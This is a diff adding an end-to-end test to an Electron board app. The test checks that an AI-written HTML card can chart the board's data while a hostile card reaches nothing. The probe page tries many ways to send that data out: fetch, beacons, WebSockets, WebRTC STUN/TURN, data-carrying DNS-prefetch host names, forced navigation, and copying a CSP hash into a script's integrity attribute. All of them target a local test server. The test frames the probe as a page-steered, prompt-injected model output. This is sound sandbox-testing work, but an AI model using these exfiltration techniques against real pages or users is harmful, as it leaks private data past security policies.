@@ -1030,6 +1030,292 @@ test("a file dropped on the board goes to the card a line takes it to, and a car
   expect(readFileSync(saveTo, "utf8")).toBe("﻿Company,City\r\nBrygga Båt AB,Malmö\r\n'=1+1,Lund\r\n");
 });
 
+// A host name only this test looks for, which a page could spell its data out in.
+const DNS_LABEL = `nest-probe-${process.pid}`;
+
+// A page that tries every way out it can, against a server only this test runs, and writes down what it saw in its own
+// page. Each address carries the board's data, as a real attempt would.
+const probePage = (port: number) => {
+  const to = (path: string) => `http://127.0.0.1:${port}/${path}`;
+  // A peer connection to a STUN server and to a TURN server over TCP, which the WebRTC policy alone doesn't stop.
+  const peer = (label: string) =>
+    `const peer = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${port}' }, { urls: 'turn:127.0.0.1:${port}?transport=tcp', username: '${label}', credential: 'p' }] }); peer.createDataChannel('${label}'); peer.createOffer().then((offer) => peer.setLocalDescription(offer));`;
+  const attribute = (text: string) => text.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
+  return `<!doctype html><html><head>
+<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src *; img-src *">
+<meta http-equiv="refresh" content="1;url=${to("refresh")}">
+<link rel="dns-prefetch" href="http://probe.localhost:${port}/">
+<link rel="dns-prefetch" href="${to("dns")}">
+<link rel="dns-prefetch" href="https://${DNS_LABEL}-markup.example.com/">
+<link rel="preconnect" href="https://${DNS_LABEL}-preconnect.example.com/">
+<link rel="preconnect" href="${to("preconnect")}">
+<link rel="preconnect" href="http://probe.localhost:${port}/">
+<link rel="prefetch" href="${to("prefetch")}">
+<link rel="stylesheet" href="${to("style.css")}">
+<script src="${to("script.js")}"></script>
+<base href="${to("base/")}">
+</head><body>
+<img src="${to("img")}"><iframe src="${to("frame")}"></iframe>
+<iframe srcdoc="${attribute(`<script>fetch('${to("nested")}'); ${peer("nested")}</script>`)}"></iframe>
+<iframe src="${attribute(`javascript:'<script>${peer("javascript").replace(/'/g, "\\'")}</script>'`)}"></iframe>
+<img src="data:," onerror="${attribute(`${peer("handler")}`)}">
+<form id="f" action="${to("form")}" method="post"><input name="d"></form>
+<a id="self" href="${to("link")}">x</a><a id="blank" target="_blank" href="${to("blank")}">x</a><a id="top" target="_top" href="${to("top")}">x</a>
+<a id="js" href="javascript:${attribute(peer("link"))}">x</a>
+<script>
+const seen = {};
+const data = encodeURIComponent(JSON.stringify(window.nest.data));
+seen.api = typeof window.chromeAPI;
+seen.origin = self.origin;
+seen.rtc = typeof RTCPeerConnection + "/" + typeof webkitRTCPeerConnection + "/" + Object.getOwnPropertyNames(window).filter((name) => /^(webkit)?rtc/i.test(name)).length;
+try { seen.parent = typeof parent.document; } catch { seen.parent = "blocked"; }
+try { seen.topApi = typeof top.chromeAPI; } catch { seen.topApi = "blocked"; }
+try { seen.open = window.open("${to("open")}?" + data) === null ? "null" : "opened"; } catch { seen.open = "threw"; }
+fetch("${to("fetch")}?" + data).then(() => (seen.fetch = "sent"), () => (seen.fetch = "refused"));
+try { navigator.sendBeacon("${to("beacon")}", data); } catch {}
+try { new WebSocket("ws://127.0.0.1:${port}/ws"); } catch {}
+try { new EventSource("${to("events")}"); } catch {}
+try { new Image().src = "${to("image")}?" + data; } catch {}
+for (const rel of ["dns-prefetch", "preconnect", "prefetch"]) try { const link = document.createElement("link"); link.rel = rel; link.href = "https://${DNS_LABEL}-" + rel + "-" + data.length + ".example.com/"; document.head.append(link); } catch {}
+try { const script = document.createElement("script"); script.src = "${to("dynamic.js")}?" + data; document.head.append(script); } catch {}
+// A script from anywhere is let in by a policy if its integrity names a hash the policy allows, so it copies ours.
+try {
+  const hash = document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.match(/sha256-[^']+/)[0];
+  const script = document.createElement("script");
+  script.integrity = hash;
+  script.crossOrigin = "anonymous";
+  script.src = "${to("integrity.js")}?" + data;
+  document.head.append(script);
+} catch {}
+try { document.getElementById("f").submit(); } catch {}
+for (const id of ["blank", "top", "js"]) try { document.getElementById(id).click(); } catch {}
+// A frame made here has an origin of its own, so it can't lend this page its WebRTC, and runs nothing it's given.
+const made = document.createElement("iframe");
+made.srcdoc = "<script>" + ${JSON.stringify(peer("made"))} + "</" + "script>";
+document.body.append(made);
+try { seen.borrowed = typeof made.contentWindow.RTCPeerConnection; } catch { seen.borrowed = "blocked"; }
+try { new RTCPeerConnection(); seen.made = "made"; } catch { seen.made = "threw"; }
+setTimeout(() => { try { location.href = "${to("navigate")}?" + data; } catch {} }, 300);
+setTimeout(() => { try { document.getElementById("self").click(); } catch {} }, 600);
+setInterval(() => console.log("seen " + (document.body.dataset.seen = JSON.stringify(seen))), 100);
+</script></body></html>`;
+};
+
+// A page that draws a chart from the card's own table, with the bundled library, and says what it drew.
+const CHART_PAGE = `<!doctype html><html><head><style>body { margin: 0; font: 13px system-ui; } @media (prefers-color-scheme: dark) { body { color: #eee; background: #1d1d1f; } }</style></head>
+<body><h1 style="font-size:14px;margin:8px 12px"></h1><button id="sort" style="margin:0 12px">Sort</button><div style="position:relative;height:220px;padding:0 12px"><canvas id="chart"></canvas></div>
+<script>
+const table = window.nest.data.inputs[0].table;
+document.querySelector("h1").textContent = table.header[1] + " by " + table.header[0];
+const chart = new nest.charts(document.getElementById("chart"), {
+  type: "bar",
+  data: { labels: table.rows.map((row) => row[0]), datasets: [{ label: table.header[1], data: table.rows.map((row) => Number(row[1])), backgroundColor: "#5b6cff" }] },
+  options: { animation: false, maintainAspectRatio: false },
+});
+document.body.dataset.drawn = JSON.stringify(chart.data.datasets[0].data);
+document.body.dataset.zero = String(nest.charts.defaults.scales.linear.beginAtZero);
+document.getElementById("sort").addEventListener("click", () => (document.body.dataset.sorted = JSON.stringify([...chart.data.datasets[0].data].sort((a, b) => b - a))));
+document.addEventListener("DOMContentLoaded", () => (document.body.dataset.ready = "yes"));
+</script></body></html>`;
+
+test("a card makes an HTML card that charts its real data live, and a hostile one reaches nothing at all", async () => {
+  test.setTimeout(90_000);
+  model.reset();
+  // Everything that could reach this server counts: a request, a connection with no request, such as a preconnect, and a
+  // datagram, such as a STUN request.
+  const requests: string[] = [];
+  let connections = 0;
+  const server = createServer((request, response) => {
+    requests.push(request.url ?? "");
+    response.end("ok");
+  });
+  server.on("connection", () => connections++);
+  server.on("upgrade", (request, socket) => {
+    requests.push(request.url ?? "");
+    socket.destroy();
+  });
+  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+  const port = (server.address() as AddressInfo).port;
+  const { createSocket } = await import("node:dgram");
+  const udp = createSocket("udp4");
+  let datagrams = 0;
+  udp.on("message", () => datagrams++);
+  await new Promise<void>((resolve) => udp.bind(port, "127.0.0.1", resolve));
+  try {
+    app = await launchApp(undefined, { modelEnv: model.env });
+    await app.evaluate(({ BaseWindow }) => BaseWindow.getAllWindows()[0].setSize(1440, 900));
+    const chrome = await findView(app, "view=chrome");
+    const shots = async (name: string) => {
+      if (!SHOTS) return;
+      for (const appearance of ["light", "dark"] as const) {
+        await chrome.evaluate((theme) => window.chromeAPI.settings.updateSettings({ appearance: theme }), appearance);
+        // Playwright holds prefers-color-scheme at light, which a page on a card goes by.
+        await chrome.emulateMedia({ colorScheme: appearance });
+        await chrome.waitForTimeout(400);
+        await chrome.screenshot({ path: join(SHOTS, `${name}-${appearance}.png`) });
+      }
+      await chrome.evaluate(() => window.chromeAPI.settings.updateSettings({ appearance: "light" }));
+      await chrome.emulateMedia({ colorScheme: "light" });
+    };
+    await chrome.getByRole("button", { name: "New nest" }).click();
+
+    // A table on the board, and a card that reads it.
+    const pane = chrome.locator(".react-flow__pane");
+    const box = (await pane.boundingBox())!;
+    const dropped = await chrome.evaluateHandle(() => {
+      const transfer = new DataTransfer();
+      transfer.items.add(new File(["Region,Deals\nNorth,12\nSouth,30\nWest,7"], "deals.csv", { type: "text/csv" }));
+      return transfer;
+    });
+    for (const type of ["dragenter", "dragover", "drop"]) await pane.dispatchEvent(type, { dataTransfer: dropped, clientX: box.x + 120, clientY: box.y + 120 });
+    const table = chrome.locator(".react-flow__node").first();
+    await expect(table).toContainText("3 rows, 2 columns");
+    await table.hover();
+    await table.getByLabel("Pull a new card out of deals").click();
+    const card = chrome.locator(".react-flow__node").nth(1);
+
+    // Every host name anything in the app looks up shows in the net log, so a lookup a page spells data out in would.
+    const netLogFile = join(mkdtempSync(join(tmpdir(), "blueberry-net-")), "net.json");
+    await app.evaluate(({ netLog }, path) => netLog.startLogging(path), netLogFile);
+
+    // Its bird makes two pages in one reply: a chart, and one a page steered it into, which tries to send the data out.
+    model.callTools(
+      { name: "save_file", args: { name: "deals chart", kind: "html", content: CHART_PAGE } },
+      { name: "save_file", args: { name: "probe", kind: "html", content: probePage(port) } }
+    );
+    model.replyWith("I made a chart of the deals.");
+    await card.getByRole("textbox", { name: "What should Berry do?" }).fill("Chart the deals by region");
+    await card.getByRole("textbox", { name: "What should Berry do?" }).press("Enter");
+    await expect(card.getByRole("status")).toHaveText("Done");
+    const tool = model.requests[0].tools?.find((each) => each.function.name === "save_file");
+    expect((tool?.function as { description?: string } | undefined)?.description).toContain("window.nest.data");
+
+    // The chart runs live on its card, drawn from the table its maker reads, with the bundled library.
+    const chartCard = chrome.getByRole("group", { name: "The file deals chart.html" });
+    await expect(chartCard).toContainText("HTML page");
+    const chartFrame = chartCard.locator("iframe[data-html-page]");
+    await expect(chartFrame).toHaveAttribute("sandbox", "allow-scripts");
+    await expect(chartFrame.contentFrame().locator("body")).toHaveAttribute("data-drawn", "[12,30,7]");
+    await expect(chartFrame.contentFrame().locator("h1")).toHaveText("Deals by Region");
+    await expect(chartFrame.contentFrame().locator("body")).toHaveAttribute("data-zero", "true");
+    // Its script ran before DOMContentLoaded, as a page's own would, and a real click reaches it.
+    await expect(chartFrame.contentFrame().locator("body")).toHaveAttribute("data-ready", "yes");
+    await chartFrame.contentFrame().getByRole("button", { name: "Sort" }).click();
+    await expect(chartFrame.contentFrame().locator("body")).toHaveAttribute("data-sorted", "[30,12,7]");
+    const painted = await chartFrame.contentFrame().locator("canvas").evaluate((canvas: HTMLCanvasElement) => {
+      const pixels = canvas.getContext("2d")!.getImageData(0, 0, canvas.width, canvas.height).data;
+      let count = 0;
+      for (let index = 3; index < pixels.length; index += 4) if (pixels[index] > 0) count++;
+      return count;
+    });
+    expect(painted).toBeGreaterThan(1000);
+    // Joined to the card that made it.
+    await expect(chrome.locator(".react-flow__edge")).toHaveCount(3);
+
+    // The hostile page ran, found no API, no parent and no origin, and reached nothing.
+    const probe = chrome.getByRole("group", { name: "The file probe.html" }).locator("iframe[data-html-page]");
+    await expect(probe.contentFrame().locator("body")).toHaveAttribute("data-seen", /"fetch":"refused"/);
+    // Long enough for the refresh, the navigations, the clicks and the ICE gathering.
+    await chrome.waitForTimeout(4000);
+    const seen = JSON.parse((await probe.contentFrame().locator("body").getAttribute("data-seen"))!);
+    expect(seen).toMatchObject({ api: "undefined", origin: "null", parent: "blocked", topApi: "blocked", open: "null", fetch: "refused", rtc: "undefined/undefined/0", borrowed: "blocked", made: "threw" });
+    expect(requests).toEqual([]);
+    expect(connections).toBe(0);
+    expect(datagrams).toBe(0);
+    await app.evaluate(({ netLog }) => netLog.stopLogging());
+    expect(readFileSync(netLogFile, "utf8")).not.toContain(DNS_LABEL);
+    // Each card is still its own page, and nothing opened a tab or a window anywhere. A frame inside the page the policy
+    // refused still names where it was meant to go, though nothing went there.
+    const reached = await app.evaluate(({ webContents }, port) => {
+      const all = webContents.getAllWebContents();
+      const cards = all.flatMap((contents) => contents.mainFrame.frames.filter((frame) => frame.origin === "null").map((frame) => frame.url));
+      return { pages: all.map((contents) => contents.getURL()).filter((url) => url.includes(`:${port}`)), cards };
+    }, port);
+    expect(reached.pages).toEqual([]);
+    expect(reached.cards).toEqual(["about:srcdoc", "about:srcdoc"]);
+    await shots("html-cards");
+
+    // Opened, it's bigger and still live. Closed, it's back on the board.
+    await chartCard.hover();
+    await chartCard.getByRole("button", { name: "Open the page" }).click();
+    await expect(chartFrame.contentFrame().locator("body")).toHaveAttribute("data-drawn", "[12,30,7]");
+    expect((await chartCard.boundingBox())!.width).toBeGreaterThan(800);
+    await shots("html-card-open");
+    await chartCard.getByRole("button", { name: "Close the page" }).click();
+
+    // Download writes the page as the bird wrote it, with its policy and its library in the same sandboxed frame inside a
+    // page that runs nothing, and none of the board's data, only where the save dialog says, which says so.
+    const folder = mkdtempSync(join(tmpdir(), "blueberry-nest-html-"));
+    const download = async (name: string) => {
+      const saveTo = join(folder, `${name}.html`);
+      await app.evaluate(({ dialog }, path) => {
+        dialog.showSaveDialog = (async (_window: unknown, options: { title: string; message?: string }) => {
+          (globalThis as unknown as { saveAsked: unknown }).saveAsked = { title: options.title, message: options.message };
+          return { canceled: false, filePath: path };
+        }) as never;
+      }, saveTo);
+      const card = chrome.getByRole("group", { name: `The file ${name}.html` });
+      await card.hover();
+      await card.getByRole("button", { name: `Download ${name}.html` }).click();
+      await expect.poll(() => existsSync(saveTo)).toBe(true);
+      return saveTo;
+    };
+    const chartFile = await download("deals chart");
+    const written = readFileSync(chartFile, "utf8");
+    expect(written.startsWith('<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\';')).toBe(true);
+    expect(written).toContain('<iframe sandbox="allow-scripts" ');
+    for (const given of ["North", "South", "West", "Deals", "Region", "I made a chart of the deals."]) expect(written).not.toContain(given);
+    expect(written).toContain("Chart.js v4.5.1");
+    expect(await app.evaluate(() => (globalThis as unknown as { saveAsked: unknown }).saveAsked)).toEqual({
+      title: "Download the page, without the board’s data",
+      message: "This is the page as the bird wrote it. The board’s data it reads on the card isn’t in it.",
+    });
+    // Opened as a file in a plain window, with none of the board's locks around it, the page loads with its data empty,
+    // and the hostile one still reaches nothing.
+    const probeFile = await download("probe");
+    // The probe's own page is gone once the policy refuses where it tried to go, so what it saw is read from what it said.
+    const opened = await app.evaluate(async ({ BrowserWindow }, [chart, probe]) => {
+      const window = new BrowserWindow({ show: false, webPreferences: { sandbox: true, contextIsolation: true } });
+      await window.loadFile(chart);
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+      const drawn = await window.webContents.mainFrame.frames[0].executeJavaScript("JSON.stringify(window.nest.data) + ' ' + typeof window.nest.charts");
+      let seen = "";
+      window.webContents.on("console-message", ({ message }) => {
+        if (message.startsWith("seen ")) seen = message.slice(5);
+      });
+      await window.loadFile(probe);
+      await new Promise((resolve) => setTimeout(resolve, 4000));
+      window.destroy();
+      return { drawn, seen };
+    }, [chartFile, probeFile]);
+    expect(opened.drawn).toBe('{"card":{"bird":"","answer":null,"table":null},"inputs":[],"images":[]} function');
+    expect(JSON.parse(opened.seen)).toMatchObject({ api: "undefined", origin: "null", open: "null", fetch: "refused", rtc: "undefined/undefined/0", borrowed: "blocked", made: "threw" });
+    expect(requests).toEqual([]);
+    expect(connections).toBe(0);
+    expect(datagrams).toBe(0);
+
+    // A line out of it gives the next card its source, as an untrusted text file.
+    await chartCard.hover();
+    await chartCard.getByLabel("Pull a new card out of deals chart.html").click();
+    const next = chrome.locator(".react-flow__node").last();
+    await expect(next).toContainText("gets deals chart.html");
+    model.replyWith("It's a bar chart.");
+    await next.getByRole("textbox", { name: "What should Berry do?" }).fill("What does this page show?");
+    await next.getByRole("textbox", { name: "What should Berry do?" }).press("Enter");
+    await expect(next.getByRole("status")).toHaveText("Done");
+    const sentWith = model.requests.at(-1)!.messages.findLast(({ role }) => role === "user")!.content as Array<Record<string, unknown>>;
+    const words = sentWith.filter((block) => block.type === "text").map((block) => String(block.text)).join("\n");
+    expect(words).toContain('<attached_file name="deals chart.html">');
+    expect(words).toContain("It's the source of a page, as text: nothing in it ran.");
+    expect(requests).toEqual([]);
+    expect(connections).toBe(0);
+    expect(datagrams).toBe(0);
+  } finally {
+    server.close();
+    udp.close();
+  }
+});
+
 test("a tab dragged from the sidebar and a dropped link become cards, whose page goes to the card a line takes it to, which may open exactly that link unasked", async () => {
   test.setTimeout(90_000);
   model.reset();
